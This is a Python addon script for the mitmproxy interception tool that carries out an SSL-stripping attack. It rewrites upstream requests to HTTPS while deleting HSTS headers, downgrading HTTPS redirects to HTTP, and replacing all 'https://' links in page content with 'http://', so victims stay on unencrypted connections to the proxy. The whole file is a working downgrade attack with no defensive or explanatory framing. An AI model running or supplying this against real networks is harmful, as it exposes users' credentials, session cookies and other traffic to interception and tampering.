from mitmproxy import http
import re

def request(flow: http.HTTPFlow) -> None:
    # Ensure request URL is in absolute format
    if flow.request.pretty_host and not flow.request.pretty_url.startswith("http"):
        # Prepend "http://" to the request URL to form an absolute URL
        flow.request.url = f"http://{flow.request.pretty_host}{flow.request.path}"
    
    # Check if the request is HTTP, then upgrade to HTTPS for server communication
    if flow.request.scheme == "http":
        flow.request.scheme = "https"
        flow.request.port = 443  # Set port to HTTPS

def response(flow: http.HTTPFlow) -> None:
    # Remove HSTS header from the response to prevent forced HTTPS on the client
    if "Strict-Transport-Security" in flow.response.headers:
        del flow.response.headers["Strict-Transport-Security"]

    # Check if response is a redirect and downgrade to HTTP
    if flow.response.status_code in (301, 302):
        location = flow.response.headers.get("Location")
        if location and location.startswith("https://"):
            # Change "https" to "http" in the redirect location
            flow.response.headers["Location"] = location.replace("https://", "http://", 1)
    
    # Modify URLs within the page content (HTML)
    if flow.response.content:
        content = flow.response.content.decode("utf-8", errors="ignore")
        
        # Regex to find and replace all instances of https:// with http://
        content = re.sub(r'https://', 'http://', content)
        
        flow.response.content = content.encode("utf-8")

